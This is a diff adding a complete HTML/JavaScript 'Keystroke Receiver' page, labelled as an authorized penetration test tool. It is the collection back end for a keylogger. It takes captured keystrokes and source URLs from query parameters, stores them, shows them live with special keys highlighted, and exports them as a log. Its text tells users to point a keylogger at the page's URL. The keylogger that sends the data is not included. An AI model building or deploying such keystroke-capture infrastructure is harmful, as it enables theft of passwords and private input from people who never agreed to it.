@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receiver — Authorized Pentest</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        h1 {
+            color: #fff;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .status-bar {
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .status-bar .stat {
+            color: #888;
+            font-size: 13px;
+        }
+        .status-bar .stat span {
+            color: #0f0;
+            font-weight: bold;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        .controls button, .controls a {
+            background: #111;
+            border: 1px solid #0ff;
+            color: #0ff;
+            padding: 8px 18px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            border-radius: 3px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .controls button:hover, .controls a:hover {
+            background: #0ff;
+            color: #000;
+        }
+        .controls button.danger {
+            border-color: #f44;
+            color: #f44;
+        }
+        .controls button.danger:hover {
+            background: #f44;
+            color: #000;
+        }
+        .entry {
+            background: #111;
+            border: 1px solid #222;
+            border-left: 3px solid #0f0;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border-radius: 4px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .entry .meta {
+            color: #666;
+            font-size: 11px;
+            margin-bottom: 6px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+        .entry .meta .ip { color: #88f; }
+        .entry .meta .url { color: #fa0; }
+        .entry .keys {
+            color: #0f0;
+            font-size: 15px;
+            word-break: break-all;
+            line-height: 1.5;
+            background: #0a0a0a;
+            padding: 8px 10px;
+            border-radius: 2px;
+            border: 1px solid #1a1a1a;
+        }
+        .entry .keys .highlight {
+            color: #ff0;
+            background: #222;
+            padding: 0 3px;
+            border-radius: 2px;
+        }
+        .empty-state {
+            color: #444;
+            text-align: center;
+            padding: 60px 20px;
+            font-size: 16px;
+        }
+        .empty-state .icon { font-size: 48px; margin-bottom: 15px; }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #0f0;
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 13px;
+            display: none;
+            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+        }
+        #live-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #0f0;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        @media (max-width: 600px) {
+            body { padding: 10px; }
+            .entry .meta { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>⌨ Keystroke Receiver</h1>
+    <p class="subtitle">Authorized Penetration Test — Internal Use Only</p>
+
+    <div class="status-bar">
+        <div class="stat">📦 Stored: <span id="entry-count">0</span> entries</div>
+        <div class="stat">📋 Total keys: <span id="total-keys">0</span></div>
+        <div class="stat"><span id="live-indicator"></span>Listening</div>
+    </div>
+
+    <div class="controls">
+        <button onclick="loadEntries()">🔄 Refresh</button>
+        <button id="auto-refresh-btn" onclick="toggleAutoRefresh()">⏸ Pause Auto-Refresh</button>
+        <button class="danger" onclick="clearEntries()">🗑 Clear All</button>
+        <a href="#" onclick="exportLog()">📥 Export TXT</a>
+    </div>
+
+    <div id="entries-container">
+        <div class="empty-state">
+            <div class="icon">📡</div>
+            Waiting for keystrokes...<br>
+            <small style="color:#555;">Point your keylogger to this page's URL</small>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">✓ Captured!</div>
+
+    <script>
+        // ============================================================
+        //  STORAGE KEY
+        // ============================================================
+        const STORAGE_KEY = 'keylog_entries';
+
+        // ============================================================
+        //  CAPTURE INCOMING DATA (via URL parameters)
+        // ============================================================
+        function captureFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const keystrokes = params.get('k');
+            const sourceUrl = params.get('u') || 'unknown';
+            const timestamp = params.get('t') || Date.now();
+
+            if (!keystrokes) return false;
+
+            const entry = {
+                id: Date.now() + '_' + Math.random().toString(36).slice(2, 6),
+                timestamp: new Date().toISOString(),
+                ip: 'captured via beacon',  // GitHub Pages can't see client IP
+                url: sourceUrl,
+                userAgent: navigator.userAgent,
+                keys: decodeURIComponent(keystrokes),
+                receivedAt: new Date().toLocaleString()
+            };
+
+            // Store
+            const entries = getEntries();
+            entries.unshift(entry);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
+
+            // Clean URL (remove params) without reloading the page
+            if (window.history.replaceState) {
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+
+            return true;
+        }
+
+        // ============================================================
+        //  CRUD Operations
+        // ============================================================
+        function getEntries() {
+            try {
+                const data = localStorage.getItem(STORAGE_KEY);
+                return data ? JSON.parse(data) : [];
+            } catch (e) {
+                return [];
+            }
+        }
+
+        function saveEntries(entries) {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
+        }
+
+        // ============================================================
+        //  RENDER
+        // ============================================================
+        function renderEntries() {
+            const entries = getEntries();
+            const container = document.getElementById('entries-container');
+            const countEl = document.getElementById('entry-count');
+            const totalKeysEl = document.getElementById('total-keys');
+
+            countEl.textContent = entries.length;
+            totalKeysEl.textContent = entries.reduce((sum, e) => sum + e.keys.length, 0);
+
+            if (entries.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="icon">📡</div>
+                        Waiting for keystrokes...<br>
+                        <small style="color:#555;">Point your keylogger to this page's URL</small>
+                    </div>
+                `;
+                return;
+            }
+
+            let html = '';
+            entries.forEach((entry, index) => {
+                const time = new Date(entry.timestamp).toLocaleString();
+                const keysDisplay = entry.keys
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/\n/g, '<span class="highlight">\\n</span><br>')
+                    .replace(/\[ENTER\]/g, '<span class="highlight">[ENTER]</span><br>')
+                    .replace(/\[TAB\]/g, '<span class="highlight">[TAB]</span>')
+                    .replace(/\[BACKSPACE\]/g, '<span class="highlight">[BACKSPACE]</span>')
+                    .replace(/\[SHIFT\]/g, '<span class="highlight">[SHIFT]</span>')
+                    .replace(/\[CTRL\]/g, '<span class="highlight">[CTRL]</span>')
+                    .replace(/\[ALT\]/g, '<span class="highlight">[ALT]</span>')
+                    .replace(/\[ESC\]/g, '<span class="highlight">[ESC]</span>')
+                    .replace(/\[DEL\]/g, '<span class="highlight">[DEL]</span>');
+
+                html += `
+                    <div class="entry">
+                        <div class="meta">
+                            <span>#${index + 1} — ${time}</span>
+                            <span class="url">${escapeHtml(entry.url)}</span>
+                        </div>
+                        <div class="keys">${keysDisplay}</div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        // ============================================================
+        //  ACTIONS
+        // ============================================================
+        function loadEntries() {
+            renderEntries();
+        }
+
+        function clearEntries() {
+            if (confirm('Delete all captured keystrokes?')) {
+                localStorage.removeItem(STORAGE_KEY);
+                renderEntries();
+                showToast('🗑 Cleared');
+            }
+        }
+
+        function exportLog() {
+            const entries = getEntries();
+            if (entries.length === 0) {
+                alert('No entries to export.');
+                return;
+            }
+
+            let text = '═══════════════════════════════════════════════════════\n';
+            text += '  KEYSTROKE LOG — Authorized Pentest\n';
+            text += '  Exported: ' + new Date().toLocaleString() + '\n';
+            text += '═══════════════════════════════════════════════════════\n\n';
+
+            entries.forEach((entry, i) => {
+                text += `--- Entry #${i + 1} ---\n`;
+                text += `Time:    ${new Date(entry.timestamp).toLocaleString()}\n`;
+                text += `URL:     ${entry.url}\n`;
+                text += `UA:      ${entry.userAgent}\n`;
+                text += `Keys:    ${entry.keys}\n\n`;
+            });
+
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `keylog_${Date.now()}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast('📥 Exported');
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.style.display = 'block';
+            clearTimeout(toast._hide);
+            toast._hide = setTimeout(() => { toast.style.display = 'none'; }, 2000);
+        }
+
+        // ============================================================
+        //  AUTO-REFRESH
+        // ============================================================
+        let autoRefreshInterval = null;
+        let autoRefreshEnabled = true;
+
+        function toggleAutoRefresh() {
+            autoRefreshEnabled = !autoRefreshEnabled;
+            const btn = document.getElementById('auto-refresh-btn');
+            if (autoRefreshEnabled) {
+                btn.textContent = '⏸ Pause Auto-Refresh';
+                startAutoRefresh();
+            } else {
+                btn.textContent = '▶ Resume Auto-Refresh';
+                stopAutoRefresh();
+            }
+        }
+
+        function startAutoRefresh() {
+            stopAutoRefresh();
+            autoRefreshInterval = setInterval(() => {
+                renderEntries();
+                // Flash the status
+                const indicator = document.getElementById('live-indicator');
+                indicator.style.background = '#0f0';
+                setTimeout(() => { indicator.style.background = '#0f0'; }, 100);
+            }, 3000);
+        }
+
+        function stopAutoRefresh() {
+            if (autoRefreshInterval) {
+                clearInterval(autoRefreshInterval);
+                autoRefreshInterval = null;
+            }
+        }
+
+        // ============================================================
+        //  INIT
+        // ============================================================
+        (function init() {
+            // Capture any incoming data first
+            const captured = captureFromURL();
+            if (captured) {
+                showToast('✓ Keystrokes captured!');
+            }
+
+            // Render entries
+            renderEntries();
+
+            // Start auto-refresh
+            startAutoRefresh();
+
+            // Listen for storage changes from other tabs
+            window.addEventListener('storage', function(e) {
+                if (e.key === STORAGE_KEY) {
+                    renderEntries();
+                }
+            });
+        })();
+    </script>
+
+</body>
+</html>
